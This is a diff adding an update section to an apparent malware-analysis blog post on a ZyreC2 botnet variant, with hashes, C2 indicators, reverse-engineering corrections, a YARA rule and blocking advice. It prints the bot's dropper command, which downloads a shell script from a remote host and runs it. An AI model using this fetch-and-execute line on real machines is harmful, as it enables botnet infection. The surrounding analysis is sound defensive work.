@@ -451,4 +451,104 @@ For defenders, blocking port 1212 outbound and dropping connections to `45[.]128
 
 ---
 
+## Update 2026-04-20: Variant C observed, plus corrections
+
+Five days after the original post, a third ZyreC2 build arrived in the feed. Same family, same C2 domain, rotated infrastructure, and a few behaviors that let us correct some claims from the first pass.
+
+### Variant C sample properties
+
+| Property | Value |
+|---|---|
+| **SHA256** | `89fd6c771387c63ebe8d71d6326e10390550140a3385de99e51dc4ab9b7d068b` |
+| **MD5** | `38defb47bffb8a507f57ed3716cf47d0` |
+| **File size** | 300 506 bytes (+44 KB vs variants A/B) |
+| **Architecture** | ELF64 x86-64, statically linked, uClibc |
+| **Stripped** | No, full symbol table + DWARF debug info |
+| **C2 domain** | `zyrec2[.]duckdns[.]org` (unchanged) |
+| **C2 IP** | `176[.]65[.]139[.]253` (AS214472 Offshore LC, Kerkrade NL) |
+| **C2 port** | 9506 / TCP (unchanged; `htons(9506) = 0x2225`) |
+| **Payload download port** | 1212 / HTTP (unchanged) |
+| **Build path** | `/root/Zyre C2/xcompile/x86_64/` (unchanged) |
+| **First seen** | 2026-04-19 |
+
+Infrastructure rotated from Hetzner DE (`45.128.119.160`) to a bulletproof-style host in the Netherlands. DuckDNS absorbs the change transparently.
+
+### Dropper simplification
+
+Variant C ships a much shorter dropper string:
+
+```
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
+(wget http://%s:1212/cat.sh -O cat.sh && sh cat.sh) >/dev/null 2>&1 &
+```
+
+Compared to variants A/B, the multi-method fallback chain (`curl` and `busybox wget`), the `chmod +x`, and the architecture suffix `%s` in the filename are gone. The bot now delegates architecture selection and execution to a single stage-one shell script `cat.sh` served from port 1212. This is a shift to a staged loader design.
+
+### Propagation
+
+Variant C contains no telnet brute-force scanner. `nm` shows no scanner-related symbols, and the `.rodata` section holds none of the usual default-credential strings (`xc3511`, `vizxv`, `root`, `admin`, etc.). Propagation in this variant depends entirely on the operator's external distribution of the `cat.sh` URL. Whether variants A/B still ship the brute-force scanner was inferred in the original post; for variant C it is confirmed absent.
+
+### Corrections to the April 15 post
+
+**1. `gen_offline_uuid` is not real MD5.** The original post described it as `MD5("OfflinePlayer:" + name)`. Disassembly at `0x4001c0` shows the function seeds four state words with the MD5 initialisation constants (`0x67452301`, `0xefcdab89`, `0x98badcfe`, `0x10325476`) and then runs a custom mixing loop of `ror`, `xor`, `add`, and shifted-byte-XOR operations over each input byte, finishing with UUIDv3 version/variant bit fixups. The output is a valid-looking RFC 4122 UUID but is not the value a real Minecraft server would compute for the same name string, so the "realistic UUIDs" benefit claimed earlier is weaker than stated.
+
+**2. `do_login_start` and `do_handshake` are Minecraft packet builders, not C2 helpers.** Cross-reference analysis (`axt` on both symbols) shows they are called only from inside `attack_mcflood`, never from the main C2 registration path. Their signatures match the public Minecraft protocol:
+
+```
+do_handshake(int fd, int pvn, char *address, uint16_t port, int next_state)
+do_login_start(int fd, char *name, uint8_t uuid[16])
+```
+
+The textbook protobuf-style varint encoder in `do_handshake` (the `shr 7 / and 0x7f / or 0x80` loop, repeated four times for the four varint fields) is therefore part of the Minecraft flood payload builder, not part of the C2 framing. The "length-prefixed varint scheme identical to Mirai's protocol" framing in the April 15 post should be read as applying to `attack_mcflood`, not to C2 registration.
+
+**3. The C2 channel is plaintext. No TLS library is linked.** `nm` on variant C returns zero SSL, TLS, libssl, or libcrypto symbols. The `tls_handshake` and `tls_done` strings that appear in the binary live exclusively in the DWARF `.debug_str` section: they are source-level enum names that leaked into debug info. The operator chose TLS-flavoured labels but shipped a plaintext TCP channel.
+
+**4. C2 registration payload is fixed-byte, not varint.** The 5-byte header `00 00 00 02 08` documented in the original post is followed by `zyre.dbg` (the channel tag the STATUS command is designed to match) and then fields extracted from `/proc/cpuinfo` (`processor`, `model name`, `Hardware`, `Machine`), each written with a single-byte length prefix, with no varint encoder invoked anywhere in `main`.
+
+**5. `attack_discord` destination port.** The 16-bit value stored into `sin_port` is `0xc351`. Read as network byte order, the actual wire destination port is `0x51c3 = 20931`, which is not in Discord's voice-RTP range (50000–65535). Whether the operator intended to call `htons(50001)` and got the byte order wrong, or intended port 20931 from the start, is ambiguous; either way the traffic the flood actually sends does not land on Discord voice infrastructure. The "Discord" label is aspirational rather than technically accurate protocol mimicry.
+
+### What stayed the same
+
+All other behaviors in the April 15 post reproduce exactly in variant C: the 18-process competitor killer list, the `Zyre%06u` bot ID format, the `OfflinePlayer:%s` prefix string, the Hetzner `/10GB.bin` bandwidth probe, the `CAPACITY|%llu|%llu` and `SPEED|%lld|%lld` telemetry messages, the `zyre.dbg` channel marker, and the full attack-command dispatch table. Variant C is a clean descendant build, not a rewrite.
+
+### Variant C YARA supplement
+
+```text
+rule ZyreC2_Variant_C {
+    meta:
+        author    = "Tao Goldi"
+        version   = 1
+        date      = "2026-04-20"
+        reference = "https://taogoldi.github.io/reverse-engineer/blog/zyrec2-gaming-mirai-ddos/"
+        hash      = "89fd6c771387c63ebe8d71d6326e10390550140a3385de99e51dc4ab9b7d068b"
+
+    strings:
+        $c2_domain  = "zyrec2.duckdns.org" ascii
+        $c2_ip_c    = "176.65.139.253" ascii
+        $build_path = "/root/Zyre C2/" ascii
+        $cat_sh     = "wget http://%s:1212/cat.sh" ascii
+        $dbg_tag    = "zyre.dbg" ascii
+
+    condition:
+        uint32(0) == 0x464C457F
+        and (
+            ($build_path and $c2_ip_c)
+            or ($cat_sh and $dbg_tag)
+            or ($c2_domain and $cat_sh)
+        )
+}
+```
+
+### Defender actions for variant C
+
+- Block or sinkhole `176[.]65[.]139[.]253:9506` in addition to `45[.]128[.]119[.]160:9506`.
+- Alert on outbound HTTP GET to `%s:1212/cat.sh` from non-shell user agents; the staged loader design means the first network event is now this single fetch.
+- Existing YARA rules from the April 15 post still match variant C on the `$build_path`, `$bot_id_fmt`, `$mc_bighandshake`, `$speed_report`, and `$offline_uuid` strings.
+
+---
+
+![Variant C context](/assets/images/posts/zyrec2/variant_c_logo.png)
+
+---
+
 *Tao Goldi - taogoldi.github.io/reverse-engineer/*
